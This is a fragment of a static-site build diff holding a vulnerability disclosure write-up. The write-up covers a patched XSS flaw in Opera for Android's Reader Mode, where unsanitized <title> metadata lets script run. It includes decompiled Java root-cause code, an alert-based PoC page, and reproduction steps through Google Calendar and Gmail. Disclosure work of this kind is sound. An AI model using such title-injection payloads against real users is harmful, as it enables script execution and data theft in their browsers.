class=\"na\"\u003eappendQueryParameter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\"ext_url\"\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ebuild\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eexternalUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edisplayString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003em7456b\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eR\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ereader_mode_url_override\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ebuild\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e \u003cli\u003eThe body is sanitized by the \u003cstrong\u003edistiller\u003c/strong\u003e.\u003c/li\u003e \u003cli\u003eBut \u003cstrong\u003emetadata (including \u003ccode\u003e\u003ctitle\u003e\u003c/code\u003e) is extracted before distillation\u003c/strong\u003e, making it a bypass vector.\u003c/li\u003e \u003c/ul\u003e \u003ch3 id=\"attack-flow\"\u003e\u003cstrong\u003eAttack Flow\u003c/strong\u003e\u003c/h3\u003e \u003cp\u003eA page containing a malicious title:\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e'XSS via Opera Reader Mode Title'\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col\u003e \u003cli\u003e \u003cp\u003eUser opens an attacker-controlled page.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eOpera’s native parser extracts the \u003ccode\u003e\u003ctitle\u003e\u003c/code\u003e and passes it to \u003ccode\u003ereceivedHtmlMetaData\u003c/code\u003e.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eJava receives it as:\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\"title\"\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e\"\u003cscript\u003ealert(...)\u003c/script\u003e\"\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e \u003cli\u003e \u003cp\u003eUser activates Reader Mode.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eReader Mode UI renders the title, executing the embedded JavaScript.\n\u003c/li\u003e \u003c/ol\u003e \u003ch3 id=\"proof-of-concept-poc\"\u003e\u003cstrong\u003eProof of Concept (PoC)\u003c/strong\u003e\u003c/h3\u003e \u003cp\u003eOne reliable vector is \u003cstrong\u003eGoogle Calendar tasks\u003c/strong\u003e, which allow custom text that gets embedded into HTML titles.\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c!DOCTYPE html\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e'XSS in Opera Reader Mode - '\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003earticle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003eFake News Headline\u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003eEngaging content to lure Reader Mode activation...\u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003earticle\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"steps-to-reproduce\"\u003e\u003cstrong\u003eSteps to Reproduce\u003c/strong\u003e\u003c/h3\u003e \u003col\u003e \u003cli\u003e \u003cp\u003eCreate a task with this title:\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e'XSS in Opera Reader Mode - '\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u003e\u003c/span\u003e \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e \u003cli\u003e \u003cp\u003eEmail the task to yourself (produces a shareable Gmail link).\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eExtract the message ID from the shared link.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eVisit the constructed URL:\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://mail.google.com/mail/u/0/#inbox/[MESSAGE_ID]?ogbl \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e \u003cli\u003e \u003cp\u003eOpen the link in Opera Browser for Android.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eEnable Reader Mode.\n\u003c/li\u003e \u003cli\u003e \u003cp\u003eObserve:\n\u003cul\u003e \u003cli\u003eClean article body (distilled).\u003c/li\u003e \u003cli\u003eJavaScript alert executes immediately due to the unsanitized title.\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003c/ol\u003e \u003ch3 id=\"disclosure-timeline\"\u003e\u003cstrong\u003eDisclosure Timeline\u003c/strong\u003e\u003c/h3\u003e \u003cul\u003e \u003cli\u003e\u003cstrong\u003eSeptember 21, 2020\u003c/strong\u003e — Vulnerability discovered\u003c/li\u003e \u003cli\u003e\u003cstrong\u003eSeptember 23, 2020\u003c/strong\u003e — Reported to Opera Security\u003c/li\u003e \u003cli\u003e\u003cstrong\u003eSeptember 25, 2020\u003c/strong\u003e — Vendor acknowledged issue\u003c/li\u003e \u003cli\u003e\u003cstrong\u003eSeptember 29, 2020\u003c/strong\u003e — Patch released\u003c/li\u003e \u003c/ul\u003e ",
+  "wordCount" : "572",
+  "inLanguage": "en",
+  "datePublished": "2025-11-16T22:07:33+08:00",
+  "dateModified": "2025-11-16T22:07:33+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/posts/1-opera-browser-mobile-xss/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Neilmark Ochea / 0xnmo",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/writeups/" accesskey="h" title="0xnmo (Alt + H)">
+                <img src="http://localhost:1313/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">0xnmo</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://mobilehackinglab.com" title="Pewpew!">
+                    <span>Pewpew!</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/writeups/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Cross-Site Scripting in Opera Browser Reader Mode via Malicious &lt;title&gt; Tag (Android)
+    </h1>
+    <div class="post-meta"><span title='2025-11-16 22:07:33 +0800 +08'>November 117, 161633</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>572 words</span>&nbsp;·&nbsp;<span>Me</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h3 id="summary"><strong>Summary</strong><a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h3>
+<p>A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s <strong>Reader Mode</strong> due to insufficient sanitization of the HTML <code>&lt;title&gt;</code> tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content.</p>
+<p>Although the Reader Mode engine (<code>opera-distiller://readermode</code>) safely distills and sanitizes the <strong>page body</strong>, removing scripts and unsafe elements, the <strong>document title is extracted much earlier</strong>, before distillation, by the native HTML parser. This unfiltered title is passed directly into the Java layer and rendered in various UI components without escaping.</p>
+<p>As a result, an attacker can embed malicious JavaScript directly inside a <code>&lt;title&gt;</code> tag and have it execute <strong>inside the Reader Mode renderer context</strong>, even though the body content is sanitized.</p>
+<h3 id="root-cause-analysis"><strong>Root Cause Analysis</strong><a hidden class="anchor" aria-hidden="true" href="#root-cause-analysis">#</a></h3>
+<p>The vulnerability exists in the bridge between native C++ metadata parsing and the Java UI layer, where <code>&lt;title&gt;</code> content is processed <strong>without any validation or escaping</strong>.</p>
+<h4 id="in-chromiumcontentjava"><strong>In ChromiumContent.java</strong><a hidden class="anchor" aria-hidden="true" href="#in-chromiumcontentjava">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@CalledByNative</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">receivedHtmlMetaData</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">strArr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Callback</span><span class="w"> </span><span class="n">callback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Callback</span><span class="p">)</span><span class="w"> </span><span class="n">obj</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strArr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">strArr</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">callback</span><span class="p">.</span><span class="na">mo93a</span><span class="p">(</span><span class="n">Collections</span><span class="p">.</span><span class="na">emptyList</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">ArrayList</span><span class="w"> </span><span class="n">arrayList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">HashMap</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">strArr</span><span class="p">.</span><span class="na">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">strArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="c1">// ← Metadata key (e.g., &#34;title&#34;, &#34;og:title&#34;)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">i</span><span class="o">++</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">strArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w"> </span><span class="c1">// ← Raw value from native parser NO sanitization, NO escaping</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                               </span><span class="c1">// → &#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;, &#34;&lt;iframe src=...&gt;&#34;, etc.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">i</span><span class="o">++</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">callback</span><span class="p">.</span><span class="na">mo93a</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">arrayList</span><span class="p">);</span><span class="w"> </span><span class="c1">// ← Delivers unsanitized metadata to Java UI layer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="c1">// → Used in tab title, address bar, history → XSS in Reader Mode</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>Native C++ parses the <em>raw</em> HTML document.</li>
+<li>It extracts <code>&lt;title&gt;</code> and other metadata, then sends them as a key–value list to Java.</li>
+<li><strong>No HTML entity encoding</strong>, <strong>no script removal</strong>, and <strong>no sanitization</strong> are performed.</li>
+<li>The Java layer later sets this title into UI components using methods like <code>TextView.setText(title)</code>, which allow script execution in Reader Mode.</li>
+</ul>
+<h4 id="in-chromiumcontentjava-1"><strong>In ChromiumContent.java</strong><a hidden class="anchor" aria-hidden="true" href="#in-chromiumcontentjava-1">#</a></h4>
+<ul>
+<li>Opera enforces distillation only for the article body:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">buildReaderModeUrl</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UrlMangler</span><span class="p">.</span><span class="na">Builder</span><span class="p">(</span><span class="s">&#34;readermode&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">Uri</span><span class="p">.</span><span class="na">Builder</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">scheme</span><span class="p">(</span><span class="s">&#34;opera-distiller&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">authority</span><span class="p">(</span><span class="s">&#34;readermode&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">path</span><span class="p">(</span><span class="n">str2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">appendQueryParameter</span><span class="p">(</span><span class="s">&#34;ext_url&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">build</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="na">toString</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">externalUrl</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">displayString</span><span class="p">(</span><span class="n">m7456b</span><span class="p">().</span><span class="na">getString</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">string</span><span class="p">.</span><span class="na">reader_mode_url_override</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>The body is sanitized by the <strong>distiller</strong>.</li>
+<li>But <strong>metadata (including <code>&lt;title&gt;</code>) is extracted before distillation</strong>, making it a bypass vector.</li>
+</ul>
+<h3 id="attack-flow"><strong>Attack Flow</strong><a hidden class="anchor" aria-hidden="true" href="#attack-flow">#</a></h3>
+<p>A page containing a malicious title:</p>
